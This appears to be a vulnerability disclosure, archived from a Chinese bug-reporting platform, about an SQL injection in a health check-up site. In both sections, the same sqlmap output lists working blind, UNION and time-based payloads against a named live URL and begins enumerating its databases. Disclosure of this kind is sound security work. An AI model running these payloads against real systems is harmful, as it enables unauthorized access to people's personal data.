wybug_title: 云健康服务平台存在SQL注入泄露大量人员信息(大量用户身份信息)
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-03-16：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-04-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 另外一处注入 详细说明：  http://tijian.jiankang.cn/?act=cdetail&hid=2
GET parameter 'hid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  nsqlmap identified the following injection points with a total of 267 HTTP(s) requests:---Place: GETParameter: hid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=cdetail&hid=2 AND 4771=4771    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: act=cdetail&hid=-5119 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7166757571,0x56454c5a615141475945,0x7168666171),NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: act=cdetail&hid=2 AND SLEEP(5)---[11:17:42] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[11:17:42] [INFO] fetching database names[11:17:43] [INFO] the SQL query used returns 21 entries[11:17:43] [INFO] retrieved: information_schema[11:17:43] [INFO] retrieved: 114_jiankang_cn


   漏洞证明：  http://tijian.jiankang.cn/?act=cdetail&hid=2
GET parameter 'hid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  nsqlmap identified the following injection points with a total of 267 HTTP(s) requests:---Place: GETParameter: hid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=cdetail&hid=2 AND 4771=4771    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: act=cdetail&hid=-5119 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7166757571,0x56454c5a615141475945,0x7168666171),NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: act=cdetail&hid=2 AND SLEEP(5)---[11:17:42] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[11:17:42] [INFO] fetching database names[11:17:43] [INFO] the SQL query used returns 21 entries[11:17:43] [INFO] retrieved: information_schema[11:17:43] [INFO] retrieved: 114_jiankang_cn
